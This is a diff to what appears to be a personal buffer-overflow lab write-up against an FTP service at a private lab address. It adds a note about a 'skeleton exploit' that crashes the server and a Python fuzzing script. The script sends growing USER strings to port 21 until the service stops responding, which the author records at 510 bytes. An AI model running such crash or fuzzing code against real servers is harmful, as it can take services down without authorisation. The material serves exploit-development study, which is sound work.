@@ -63,7 +63,9 @@ This prints 1,000 As for ease of access
 
 <img src="/images/immunity-EIP.png">
 
-#### I have Created An exploit that will crash the server 
+#### I have created an Exploit that will crash the server! 
+
+This is a skeleton exploit we will add on more stuff as we find it
 
 ```python3
 #!/usr/bin/python3
@@ -95,3 +97,39 @@ print(response)
 s.send(b"PASS parrot\r\n")
 s.close()
 ```
+
+## Automation 
+
+#### We need to find the exact crash point so we make a fuzzing script to narrow it down after manual or automate it from the begining 
+
+
+```python3
+#!/usr/bin/python3
+
+import socket
+from time import sleep 
+
+buffer = b"B" * 10
+x = 0
+
+while True: 
+    buff = (b"A" * x ) + buffer
+    print("Fuzzing " + str(len(buff)))
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    connect = s.connect(('192.168.164.170', 21))
+    resp = s.recv(1024)
+    print(resp)
+
+    s.send(b"USER " + buff + b"\r\n")
+    resp = s.recv(1024)
+
+    s.send(b"PASS PARROTASSASSIN15\r\n")
+
+    s.close
+    x = x + 100
+    sleep(2)
+```
+
+#### We find that it crashes at 510 as the server no longer responds after 
+
+<img src="/images/python3-crash.png">
